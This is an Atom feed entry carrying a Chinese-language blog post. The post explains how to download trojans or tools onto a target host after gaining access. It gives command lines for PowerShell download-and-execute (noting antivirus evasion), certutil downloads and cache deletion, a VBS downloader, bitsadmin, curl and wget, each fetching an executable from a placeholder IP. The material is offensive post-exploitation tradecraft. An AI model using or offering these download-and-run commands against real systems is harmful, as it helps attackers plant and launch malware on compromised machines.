    <updated>2021-04-14T06:06:58.130Z</updated>
    
    <content type="html"><![CDATA[<p><font color=green>获得目标一定权限后可以下载木马或其它工具到目标机。下面列举了一些常用方法</font></p><h3 id="Powershell："><a href="#Powershell：" class="headerlink" title="Powershell："></a>Powershell：</h3><p>下载并保存文件：（容易被杀毒软件检测）</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell (<span class="built_in">new-object</span> System.Net.WebClient).DownloadFile(<span class="string">'http://192.168.1.1/1.exe'</span>,<span class="string">'C:\test\1.exe'</span>)</span><br></pre></td></tr></table></figure><p>下载并执行文件：（无文件模式不易检测）</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell (<span class="built_in">new-object</span> System.Net.WebClient).DownloadFile(<span class="string">'http://192.168.1.1/1.exe'</span>,<span class="string">'C:\test\1.exe'</span>);<span class="built_in">start-process</span> <span class="string">'C:\test\1.exe'</span></span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="Certutil："><a href="#Certutil：" class="headerlink" title="Certutil："></a>Certutil：</h3><ul><li>保存在当前路径，文件名称同URL</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://192.168.1.1/1.exe</span><br></pre></td></tr></table></figure><ul><li>保存在当前路径，指定保存文件名称</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://192.168.1.1/1.txt 1.php</span><br></pre></td></tr></table></figure><p>使用downloader默认在缓存目录位置：保存下载的文件二进制副本。<br><code>%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content</code></p><ul><li>命令行删除缓存</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://192.168.1.1/1.exe delete</span><br></pre></td></tr></table></figure><ul><li>查看缓存项目</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache *</span><br></pre></td></tr></table></figure><h3 id="Vbs："><a href="#Vbs：" class="headerlink" title="Vbs："></a>Vbs：</h3><p>vbs downloader,使用msxml2.xmlhttp和adodb.stream对象<br>使用echo逐行追加写入(&gt;&gt;)test.vbs</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Set Post = CreateObject("Msxml2.XMLHTTP")</span><br><span class="line">Set Shell = CreateObject("Wscript.Shell")</span><br><span class="line">Post.Open "GET","http://192.168.1.1/1.exe",0</span><br><span class="line">Post.Send()</span><br><span class="line">Set aGet = CreateObject("ADODB.Stream")</span><br><span class="line">aGet.Mode = 3</span><br><span class="line">aGet.Type = 1</span><br><span class="line">aGet.Open()</span><br><span class="line">aGet.Write(Post.responseBody)</span><br><span class="line">aGet.SaveToFile "C:\test\1.exe",2</span><br></pre></td></tr></table></figure><p>然后执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript test.vbs</span><br></pre></td></tr></table></figure><h3 id="Bitsadmin："><a href="#Bitsadmin：" class="headerlink" title="Bitsadmin："></a>Bitsadmin：</h3><p>bitsadmin是一个命令行工具，可用于创建下载或上传工作和监测其进展情况。xp以后的Windows系统自带</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer n http://<span class="number">192.168</span>.<span class="number">1.1</span>/<span class="number">1</span>.exe  C:\test\update\<span class="number">1</span>.exe</span><br></pre></td></tr></table></figure><p>不支持https、ftp协议，php python带的服务器会出错，下载速度较慢</p><h3 id="Curl："><a href="#Curl：" class="headerlink" title="Curl："></a>Curl：</h3><p>在Linux中curl是一个利用URL规则在命令行下工作的文件传输工具，可以说是一款很强大的http命令行工具。它支持文件的上传和下载，是综合传输工具</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -O http://192.168.1.1/1.exe</span><br></pre></td></tr></table></figure><p>保存网页中的文件，要注意这里后面的url要具体到某个文件，不然抓不下来</p><h3 id="Wget："><a href="#Wget：" class="headerlink" title="Wget："></a>Wget：</h3><p>Linux系统中的wget是一个下载文件的工具， 简单直接，支持递归下载</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget  http://192.168.1.1/1.exe</span><br></pre></td></tr></table></figure><p>对下载文件重命名：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -O  new.exe  http://192.168.1.1/1.exe</span><br></pre></td></tr></table></figure><p>限速下载：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget --limit-rate=300k http://192.168.1.1/1.exe</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;font color=green&gt;获得目标一定权限后可以下载木马或其它工具到目标机。下面列举了一些常用方法&lt;/font&gt;&lt;/p&gt;
&lt;h3 id=&quot;Powershell：&quot;&gt;&lt;a href=&quot;#Powershell：&quot; class=&quot;headerlink&quot; title=&quot;Powershell：&quot;&gt;&lt;/a&gt;Powershell：&lt;/h3&gt;&lt;p&gt;下载并保存文件：（容易被杀毒软件检测）&lt;/p&gt;
&lt;figure class=&quot;highlight powershell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;powershell (&lt;span class=&quot;built_in&quot;&gt;new-object&lt;/span&gt; System.Net.WebClient).DownloadFile(&lt;span class=&quot;string&quot;&gt;&#39;http://192.168.1.1/1.exe&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;C:\test\1.exe&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;下载并执行文件：（无文件模式不易检测）&lt;/p&gt;
&lt;figure class=&quot;highlight powershell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;powershell (&lt;span class=&quot;built_in&quot;&gt;new-object&lt;/span&gt; System.Net.WebClient).DownloadFile(&lt;span class=&quot;string&quot;&gt;&#39;http://192.168.1.1/1.exe&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;C:\test\1.exe&#39;&lt;/span&gt;);&lt;span class=&quot;built_in&quot;&gt;start-process&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;C:\test\1.exe&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="Network" scheme="http://yoursite.com/categories/Network/"/>
    
    
      <category term="Linux" scheme="http://yoursite.com/tags/Linux/"/>
    
      <category term="Network" scheme="http://yoursite.com/tags/Network/"/>
    
  </entry>
  
</feed>
